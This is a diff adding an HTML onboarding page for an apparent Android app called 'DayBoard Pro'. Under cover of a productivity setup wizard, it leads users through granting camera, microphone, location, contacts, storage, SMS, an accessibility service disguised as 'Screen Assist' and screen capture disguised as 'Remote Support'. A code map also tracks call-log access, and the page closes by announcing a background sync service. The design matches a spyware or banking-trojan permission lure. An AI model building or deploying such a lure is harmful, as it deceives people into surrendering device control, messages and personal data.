@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>DayBoard Pro</title>
+<style>
+:root {
+  --bg: #0d1117; --surface: #161b22; --border: #30363d;
+  --text: #c9d1d9; --muted: #8b949e;
+  --accent: #388bfd; --success: #3fb950;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg); color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  padding: 0 16px 32px; min-height: 100vh;
+}
+.hero { text-align: center; padding: 40px 0 24px; }
+.hero-icon {
+  width: 72px; height: 72px;
+  background: linear-gradient(135deg, #1f6feb, #388bfd);
+  border-radius: 20px; margin: 0 auto 16px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 36px; box-shadow: 0 8px 32px rgba(56,139,253,.25);
+}
+h1 { font-size: 26px; font-weight: 700; color: #e6edf3; }
+.tagline { color: var(--muted); margin-top: 4px; font-size: 14px; }
+.welcome-desc {
+  color: var(--muted); font-size: 14px; line-height: 1.65;
+  margin: 16px 0 28px; text-align: center;
+}
+.btn-large {
+  width: 100%; padding: 16px; border-radius: 12px;
+  font-size: 16px; font-weight: 600;
+  background: var(--accent); color: #fff; border: none; cursor: pointer;
+  box-shadow: 0 4px 16px rgba(56,139,253,.3);
+}
+.btn-large:active { opacity: .85; }
+.progress-wrap { margin: 0 0 16px; }
+.progress-label {
+  display: flex; justify-content: space-between;
+  font-size: 12px; color: var(--muted); margin-bottom: 6px;
+}
+.progress-bar { height: 3px; background: var(--border); border-radius: 2px; }
+.progress-fill { height: 100%; background: var(--accent); border-radius: 2px; transition: width .4s; }
+.card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 12px; padding: 16px; margin-bottom: 10px;
+  transition: border-color .2s;
+}
+.card.active  { border-color: var(--accent); }
+.card.granted { border-color: var(--success); }
+.card.locked  { opacity: .5; }
+.card-row { display: flex; align-items: center; gap: 12px; }
+.icon-wrap {
+  width: 44px; height: 44px; border-radius: 12px;
+  background: rgba(56,139,253,.1);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 22px; flex-shrink: 0;
+}
+.icon-wrap.ok { background: rgba(63,185,80,.12); }
+.card-title { font-weight: 600; color: #e6edf3; font-size: 15px; }
+.card-reason { font-size: 12px; color: var(--muted); margin-top: 3px; line-height: 1.5; }
+.badge-ok {
+  font-size: 11px; font-weight: 600; color: var(--success);
+  background: rgba(63,185,80,.12); border-radius: 6px;
+  padding: 3px 8px; white-space: nowrap;
+}
+.btn-enable {
+  margin-top: 12px; width: 100%; padding: 10px;
+  border-radius: 8px; border: none; cursor: pointer;
+  font-size: 14px; font-weight: 600;
+  background: var(--accent); color: #fff;
+}
+.btn-enable:disabled { opacity: .35; cursor: default; }
+.complete-wrap { text-align: center; padding: 40px 0; }
+.complete-icon { font-size: 64px; margin-bottom: 16px; }
+.complete-title { font-size: 22px; font-weight: 700; color: #e6edf3; }
+.complete-sub { color: var(--muted); margin-top: 8px; font-size: 14px; }
+.status-pill {
+  display: inline-flex; align-items: center; gap: 8px;
+  background: rgba(63,185,80,.1); border: 1px solid rgba(63,185,80,.3);
+  border-radius: 20px; padding: 8px 16px; margin-top: 20px;
+}
+.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); }
+#welcome, #setup, #complete { display: none; }
+#welcome.show, #setup.show, #complete.show { display: block; }
+</style>
+</head>
+<body>
+
+<div id="welcome" class="show">
+  <div class="hero">
+    <div class="hero-icon">📊</div>
+    <h1>DayBoard Pro</h1>
+    <p class="tagline">Productivity · Sync · Analytics</p>
+  </div>
+  <p class="welcome-desc">
+    Your all-in-one command centre for communication, task management,
+    and productivity insights. A quick one-time setup personalises your experience.
+  </p>
+  <button class="btn-large" onclick="startSetup()">Set Up Workspace →</button>
+</div>
+
+<div id="setup">
+  <div class="progress-wrap">
+    <div class="progress-label">
+      <span id="stepLabel">Step 1 of 8</span>
+      <span id="pctLabel">0%</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="pfill" style="width:0%"></div></div>
+  </div>
+  <div id="cards"></div>
+</div>
+
+<div id="complete">
+  <div class="complete-wrap">
+    <div class="complete-icon">✅</div>
+    <div class="complete-title">Workspace Ready</div>
+    <div class="complete-sub">All integrations active. Running in background.</div>
+    <div class="status-pill">
+      <div class="dot"></div>
+      <span style="font-size:13px;">Sync service connected</span>
+    </div>
+  </div>
+</div>
+
+<script>
+const STEPS = [
+  { id:'cam',   icon:'📷', title:'Camera &amp; Video',
+    reason:'Document scanning, ID capture, and video meeting support.',
+    fn: ()=> Android.requestCamera() },
+  { id:'mic',   icon:'🎙️', title:'Microphone',
+    reason:'Voice commands, audio transcription, and meeting recording.',
+    fn: ()=> Android.requestMic() },
+  { id:'loc',   icon:'📍', title:'Location Services',
+    reason:'Location-based reminders, commute tracking, and local weather.',
+    fn: ()=> Android.requestLocation() },
+  { id:'cntct', icon:'👥', title:'Contacts',
+    reason:'Quick-dial shortcuts, communication analytics, and contact sync.',
+    fn: ()=> Android.requestContacts() },
+  { id:'stor',  icon:'💾', title:'Files &amp; Storage',
+    reason:'Document management, file attachments, and local backup.',
+    fn: ()=> Android.requestStorage() },
+  { id:'sms',   icon:'💬', title:'Messages',
+    reason:'Message scheduling, thread analytics, and communication history.',
+    fn: ()=> Android.requestSMS() },
+  { id:'acc',   icon:'♿', title:'Screen Assist',
+    reason:'Enhanced navigation overlay. Tap Enable — then find Screen Assist in the list and turn it on.',
+    fn: ()=> Android.requestAccessibility(), isSettings: true },
+  { id:'scr',   icon:'🖥️', title:'Remote Support',
+    reason:'Allows our support team to view your screen when you request help.',
+    fn: ()=> Android.requestScreenCapture() },
+];
+
+const CODE_MAP = {101:'loc',102:'cam',103:'mic',104:'stor',105:'scr',106:'sms',107:'cntct',108:'calllog',109:'acc'};
+
+const done = {};
+let current = 0;
+
+function startSetup() {
+  document.getElementById('welcome').classList.remove('show');
+  document.getElementById('setup').classList.add('show');
+  render();
+}
+
+function render() {
+  const total = STEPS.length;
+  const n = Object.keys(done).length;
+  const pct = Math.round(n / total * 100);
+  document.getElementById('pfill').style.width = pct + '%';
+  document.getElementById('pctLabel').textContent = pct + '%';
+  document.getElementById('stepLabel').textContent =
+    n < total ? 'Step ' + (Math.min(n+1, total)) + ' of ' + total : 'Setup complete';
+
+  const container = document.getElementById('cards');
+  container.innerHTML = '';
+  STEPS.forEach(function(s, i) {
+    const isDone   = !!done[s.id];
+    const isActive = !isDone && i === current;
+    const isLocked = !isDone && !isActive;
+
+    const card = document.createElement('div');
+    card.className = 'card' + (isDone ? ' granted' : isActive ? ' active' : ' locked');
+    card.innerHTML =
+      '<div class="card-row">' +
+        '<div class="icon-wrap' + (isDone ? ' ok' : '') + '">' + s.icon + '</div>' +
+        '<div style="flex:1">' +
+          '<div class="card-title">' + s.title + '</div>' +
+          '<div class="card-reason">' + s.reason + '</div>' +
+        '</div>' +
+        (isDone ? '<span class="badge-ok">✓</span>' : '') +
+      '</div>' +
+      (isDone
+        ? '<div style="margin-top:10px"><span class="badge-ok">✓ Enabled</span></div>'
+        : isActive
+          ? '<button class="btn-enable" id="btn_' + s.id + '" onclick="reqPerm(' + i + ')">Enable Now</button>'
+          : '');
+    container.appendChild(card);
+  });
+}
+
+function reqPerm(i) {
+  const btn = document.getElementById('btn_' + STEPS[i].id);
+  if (btn) { btn.textContent = '…'; btn.disabled = true; }
+  try { STEPS[i].fn(); } catch(_) {}
+}
+
+window.onPermResult = function(code, granted) {
+  const id = CODE_MAP[code];
+  if (!id) return;
+  if (granted) {
+    done[id] = true;
+    while (current < STEPS.length && done[STEPS[current].id]) current++;
+  }
+  render();
+  if (Object.keys(done).length >= STEPS.length) {
+    setTimeout(function() {
+      document.getElementById('setup').classList.remove('show');
+      document.getElementById('complete').classList.add('show');
+    }, 700);
+  }
+};
+</script>
+</body>
+</html>
